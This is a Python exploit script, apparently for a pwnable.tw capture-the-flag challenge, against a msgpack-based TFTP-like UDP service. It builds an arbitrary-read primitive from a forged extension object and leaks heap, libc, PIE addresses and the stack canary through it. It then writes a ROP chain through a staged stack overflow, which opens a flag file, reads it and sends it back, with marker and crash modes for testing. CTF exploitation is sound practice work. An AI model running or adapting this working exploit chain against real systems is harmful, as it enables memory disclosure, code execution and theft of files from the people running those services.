#!/usr/bin/env python3

import argparse
import re
import socket
import struct
import time
import zlib

import msgpack


HOST = "chall.pwnable.tw"
TCP_PORT = 10309

IO_FILE_JUMPS = 0x3E82A0
ENVIRON = 0x3EE098
REQUEST_DELTA = 0x13B10
AT_NULL = 0
AT_PHDR = 3
AT_RANDOM = 25

POP_RDI = 0x2155F
POP_RSI = 0x23E6A
POP_RDX = 0x1306B6
POP_RSP = 0x23993
CONNECT = 0x1228A0
OPEN = 0x10FC40
READ = 0x110070
WRITE = 0x110140
EXIT = 0x43120
SEND_DATA = 0x257E

REQ_SOCKADDR = 296


def get_udp_port(host, tcp_port):
    io = socket.create_connection((host, tcp_port), timeout=5)
    banner = io.recv(128)
    m = re.search(rb"(\d+)", banner)
    if not m:
        raise RuntimeError(f"bad banner: {banner!r}")
    return io, int(m.group(1))


def make_udp(io=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if io is None:
        s.bind(("0.0.0.0", 0))
    else:
        s.bind(("0.0.0.0", io.getsockname()[1]))
    s.settimeout(5)
    return s


def send_recv(sock, host, udp_port, pkt):
    sock.sendto(msgpack.packb(pkt, use_bin_type=True), (host, udp_port))
    data, _ = sock.recvfrom(65535)
    return msgpack.unpackb(data, raw=True, strict_map_key=False)


def find_extra_key(pkt, known):
    if not isinstance(pkt, list) or pkt[0] != 6 or not isinstance(pkt[1], dict):
        return None
    for k in pkt[1]:
        if k not in known:
            return k
    return None


def leak_heap(sock, host, udp_port):
    opts = {f"k{i:04d}": i for i in range(20)}
    send_recv(sock, host, udp_port, [2, "x", "octet", opts, 0])
    time.sleep(0.05)
    pkt = send_recv(sock, host, udp_port, [2, "x", "octet", ["pad", 1], 0])
    leak = find_extra_key(pkt, {b"pad", "pad"})
    if not isinstance(leak, (bytes, bytearray)) or len(leak) != 5:
        raise RuntimeError(f"heap leak failed: {pkt!r}")
    return int.from_bytes(leak, "little") << 8


def build_fake_ext(ptr, size, value=1):
    fake = bytearray(0x30)
    struct.pack_into("<I", fake, 0x00, 5)
    struct.pack_into("<Q", fake, 0x08, size)
    struct.pack_into("<Q", fake, 0x10, ptr)
    struct.pack_into("<I", fake, 0x18, 2)
    struct.pack_into("<Q", fake, 0x20, value)
    return msgpack.ExtType(1, bytes(fake))


def arb_read(sock, host, udp_port, addr, size):
    for _ in range(6):
        try:
            pkt = send_recv(sock, host, udp_port, [2, "x", "octet", build_fake_ext(addr, size), 0])
            leak = find_extra_key(pkt, {b"tsize", "tsize"})
            if leak is None:
                continue
            if isinstance(leak, str):
                leak = leak.encode()
            return bytes(leak)
        except Exception:
            continue
    return b""


def leak_ptr(sock, host, udp_port, addr):
    data = arb_read(sock, host, udp_port, addr, 8)
    return int.from_bytes(data.ljust(8, b"\x00"), "little")


def find_auxv(sock, host, udp_port, envp, max_env=256):
    for i in range(max_env):
        ptr = leak_ptr(sock, host, udp_port, envp + i * 8)
        if ptr == 0:
            return envp + (i + 1) * 8, i
    raise RuntimeError("failed to find auxv")


def parse_auxv(sock, host, udp_port, auxv_addr, max_entries=64):
    out = []
    for i in range(max_entries):
        t = leak_ptr(sock, host, udp_port, auxv_addr + i * 0x10)
        v = leak_ptr(sock, host, udp_port, auxv_addr + i * 0x10 + 8)
        out.append((t, v))
        if t == AT_NULL:
            break
    return out


def leak_state(sock, host, udp_port):
    heap_base = leak_heap(sock, host, udp_port)
    request = heap_base + REQUEST_DELTA
    filep = leak_ptr(sock, host, udp_port, request + 0x110)
    libc_base = leak_ptr(sock, host, udp_port, filep + 0xD8) - IO_FILE_JUMPS
    envp = leak_ptr(sock, host, udp_port, libc_base + ENVIRON)
    auxv_addr, envc = find_auxv(sock, host, udp_port, envp)
    auxv = parse_auxv(sock, host, udp_port, auxv_addr)
    at_phdr = 0
    at_random = 0
    for t, v in auxv:
        if t == AT_PHDR:
            at_phdr = v
        elif t == AT_RANDOM:
            at_random = v
    pie_base = at_phdr - 0x40
    random_blob = arb_read(sock, host, udp_port, at_random, 16)
    if len(random_blob) < 8:
        raise RuntimeError(f"short AT_RANDOM read at 0x{at_random:x}: {random_blob!r}")
    canary = int.from_bytes(random_blob[:8], "little") & ~0xFF
    if canary == 0:
        raise RuntimeError("invalid zero canary leak")
    return {
        "heap_base": heap_base,
        "request": request,
        "libc_base": libc_base,
        "envp": envp,
        "envc": envc,
        "auxv_addr": auxv_addr,
        "pie_base": pie_base,
        "canary": canary,
    }


def find_canary_slot(sock, host, udp_port, envp, canary, window=0x200):
    want = p64(canary)[1:]
    start = (envp - window) & ~7
    end = envp & ~7
    for addr in range(start, end + 1, 8):
        data = arb_read(sock, host, udp_port, addr + 1, 7)
        if data == want:
            return addr
    return 0


def mp_uint(x):
    return msgpack.packb(x, use_bin_type=True)


def mp_str_raw(data):
    n = len(data)
    if n <= 31:
        return bytes([0xA0 | n]) + data
    if n <= 0xFF:
        return b"\xD9" + bytes([n]) + data
    if n <= 0xFFFF:
        return b"\xDA" + struct.pack(">H", n) + data
    return b"\xDB" + struct.pack(">I", n) + data


def build_data_rawstr(blockno, crc, data):
    return b"\x94" + mp_uint(3) + mp_uint(blockno) + mp_uint(crc) + mp_str_raw(data)


def crc_for_stage(data):
    return zlib.crc32(data[:-1]) & 0xFFFFFFFF


def send_stage(sock, host, udp_port, blksize, data):
    wrq = [2, "x", "octet", {"blksize": blksize}, 0]
    sock.sendto(msgpack.packb(wrq, use_bin_type=True), (host, udp_port))
    oack = msgpack.unpackb(sock.recvfrom(65535)[0], raw=False, strict_map_key=False)
    crc = crc_for_stage(data)
    pkt = build_data_rawstr(1, crc, data)
    sock.sendto(pkt, (host, udp_port))
    resp = msgpack.unpackb(sock.recvfrom(65535)[0], raw=False, strict_map_key=False)
    return oack, crc, resp


def p64(x):
    return struct.pack("<Q", x)


def build_marker_chain(state, rbp):
    libc = state["libc_base"]
    request = state["request"]
    pivot = rbp + 0x30
    mark_addr = rbp + 0x120
    chain = []
    for fd in range(5):
        chain.extend(
            [
                libc + POP_RDI,
                fd,
                libc + POP_RSI,
                request + REQ_SOCKADDR,
                libc + POP_RDX,
                16,
                libc + CONNECT,
                libc + POP_RDI,
                fd,
                libc + POP_RSI,
                mark_addr,
                libc + POP_RDX,
                8,
                libc + WRITE,
            ]
        )
    chain.extend([libc + POP_RDI, 0, libc + EXIT])
    extras = [(mark_addr, b"MARKER!!")]
    return pivot, chain, extras


def build_stdout_marker_chain(state, rbp):
    libc = state["libc_base"]
    pivot = rbp + 0x30
    mark_addr = rbp + 0x120
    chain = [
        libc + POP_RDI,
        1,
        libc + POP_RSI,
        mark_addr,
        libc + POP_RDX,
        8,
        libc + WRITE,
        libc + POP_RDI,
        0,
        libc + EXIT,
    ]
    extras = [(mark_addr, b"MARKER!!")]
    return pivot, chain, extras


def build_udp_marker_chain(state, rbp):
    pie = state["pie_base"]
    request = state["request"]
    pivot = rbp + 0x30
    mark_addr = rbp + 0x120
    chain = [
        request,
        mark_addr,
        4,
        pie + SEND_DATA,
    ]
    # Converted into actual calls below.
    rop = [
        state["libc_base"] + POP_RDI,
        chain[0],
        state["libc_base"] + POP_RSI,
        chain[1],
        state["libc_base"] + POP_RDX,
        chain[2],
        chain[3],
        state["libc_base"] + POP_RDI,
        0,
        state["libc_base"] + EXIT,
    ]
    extras = [(mark_addr, b"MARK")]
    return pivot, rop, extras


def build_crash_chain(state, rbp):
    pivot = rbp + 0x30
    chain = [0x4444444444444444]
    return pivot, chain, []


def build_orw_chain(state, rbp):
    libc = state["libc_base"]
    pie = state["pie_base"]
    request = state["request"]
    pivot = rbp + 0x30
    path_addr = rbp + 0x130
    data_addr = rbp + 0x150
    chain = [
        libc + POP_RDI,
        path_addr,
        libc + POP_RSI,
        0,
        libc + OPEN,
        libc + POP_RDI,
        3,
        libc + POP_RSI,
        data_addr,
        libc + POP_RDX,
        0x80,
        libc + READ,
        libc + POP_RDI,
        request,
        libc + POP_RSI,
        data_addr,
        libc + POP_RDX,
        0x80,
        pie + SEND_DATA,
        libc + POP_RDI,
        0,
        libc + EXIT,
    ]
    extras = [
        (path_addr, b"/home/hitcon_ftp/flag\x00"),
        (data_addr, b"D" * 0x90),
    ]
    return pivot, chain, extras


def build_image(state, rbp, mode):
    buf = rbp - 0x224
    libc = state["libc_base"]
    canary = state["canary"]
    saved_rip = libc + POP_RSP

    mem = {}

    def put(off, data):
        for i, b in enumerate(data):
            mem[off + i] = b

    put(0x20C, p64(canary))
    put(0x214, p64(0x4242424242424242))
    put(0x21C, p64(0x4343434343434343))
    put(0x224, p64(rbp))
    put(0x22C, p64(saved_rip))

    extras = []
    if mode == "crash":
        pivot, chain, extras = build_crash_chain(state, rbp)
    elif mode == "marker-ack":
        pivot, chain, extras = build_marker_chain(state, rbp)
    elif mode == "marker-udp":
        pivot, chain, extras = build_udp_marker_chain(state, rbp)
    elif mode == "marker-stdout":
        pivot, chain, extras = build_stdout_marker_chain(state, rbp)
    elif mode == "orw":
        pivot, chain, extras = build_orw_chain(state, rbp)
    else:
        raise ValueError(f"bad mode: {mode}")

    put(0x234, p64(pivot))

    off = pivot - buf
    for q in chain:
        put(off, p64(q))
        off += 8

    for addr, data in extras:
        put(addr - buf, data)

    return {
        "rbp": rbp,
        "buf": buf,
        "pivot": pivot,
        "saved_rip": saved_rip,
        "mem": mem,
        "max_byte": max(mem),
    }


def build_stages(mem, max_byte):
    zero_offs = sorted(
        [o for o in range(1, max_byte + 1) if mem.get(o, 0x41) == 0],
        reverse=True,
    )
    # Packet data length is len-2 here. The string printer writes:
    #   buf[0] = '"'
    #   buf[1..a8-1] = data[0..a8-2]
    #   buf[a8] = '\0'
    # Therefore:
    # - to control output offset k, we need a8-1 >= k  => len >= k+3
    # - to restore a zero at offset k, we need a8 == k => len == k+2
    stage_lens = [max_byte + 3] + [o + 2 for o in zero_offs]
    stages = []
    for ln in stage_lens:
        data = bytearray()
        for off in range(1, ln - 1):
            b = mem.get(off, 0x41)
            data.append(b if b != 0 else 0x41)
        stages.append((ln, bytes(data)))
    return stages


def recv_until_timeout(sock, timeout):
    end = time.time() + timeout
    out = []
    while time.time() < end:
        remain = end - time.time()
        sock.settimeout(remain)
        try:
            data, peer = sock.recvfrom(65535)
        except TimeoutError:
            break
        out.append((peer, data))
    return out


def run(host, tcp_port, udp_port_direct, mode, rbp_delta, canary_window, listen_timeout):
    io = None
    if udp_port_direct is None:
        io, udp_port = get_udp_port(host, tcp_port)
        sock = make_udp(io)
    else:
        udp_port = udp_port_direct
        sock = make_udp(None)
    sock.settimeout(10)

    state = leak_state(sock, host, udp_port)
    canary_slot = find_canary_slot(sock, host, udp_port, state["envp"], state["canary"], canary_window)
    if not canary_slot:
        raise RuntimeError("failed to locate canary slot on stack")
    rbp = canary_slot + 0x18
    layout = build_image(state, rbp, mode)
    stages = build_stages(layout["mem"], layout["max_byte"])

    print(f"mode       = {mode}", flush=True)
    print(f"udp_port   = {udp_port}", flush=True)
    print(f"heap_base  = 0x{state['heap_base']:x}", flush=True)
    print(f"request    = 0x{state['request']:x}", flush=True)
    print(f"libc_base  = 0x{state['libc_base']:x}", flush=True)
    print(f"pie_base   = 0x{state['pie_base']:x}", flush=True)
    print(f"envp       = 0x{state['envp']:x}", flush=True)
    print(f"canary_slot= 0x{canary_slot:x}", flush=True)
    print(f"rbp_delta  = 0x{rbp_delta:x}", flush=True)
    print(f"rbp_guess  = 0x{layout['rbp']:x}", flush=True)
    print(f"canary     = 0x{state['canary']:016x}", flush=True)
    print(f"pivot      = 0x{layout['pivot']:x}", flush=True)
    print(f"saved_rip  = 0x{layout['saved_rip']:x}", flush=True)
    print(f"stages     = {len(stages)}", flush=True)

    for idx, (ln, data) in enumerate(stages, 1):
        _oack, crc, resp = send_stage(sock, host, udp_port, 2048, data)
        print(
            f"stage {idx:02d}/{len(stages)} len=0x{ln:x} crc=0x{crc:08x} resp={resp!r}",
            flush=True,
        )
        if resp != [4, 1]:
            raise RuntimeError(f"stage failed: {resp!r}")

    packets = []
    if listen_timeout > 0:
        print("waiting for delayed packets...", flush=True)
        packets = recv_until_timeout(sock, listen_timeout)
    else:
        print("stages sent; not waiting for delayed packets", flush=True)
    for peer, data in packets:
        print(f"from {peer}: {data!r}", flush=True)
        try:
            print(msgpack.unpackb(data, raw=False, strict_map_key=False), flush=True)
        except Exception:
            pass

    if io is not None:
        io.close()
    sock.close()
    return packets


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--tcp-port", type=int, default=TCP_PORT)
    ap.add_argument("--udp-port-direct", type=int)
    ap.add_argument(
        "--mode",
        choices=["crash", "marker-ack", "marker-udp", "marker-stdout", "orw"],
        # "crash" is useful for local verification of ret-control.
        default="marker-ack",
    )
    ap.add_argument("--rbp-delta", type=lambda s: int(s, 0), default=0x100)
    ap.add_argument("--canary-window", type=lambda s: int(s, 0), default=0x200)
    ap.add_argument("--listen-timeout", type=int, default=75)
    args = ap.parse_args()
    run(
        args.host,
        args.tcp_port,
        args.udp_port_direct,
        args.mode,
        args.rbp_delta,
        args.canary_window,
        args.listen_timeout,
    )


if __name__ == "__main__":
    main()
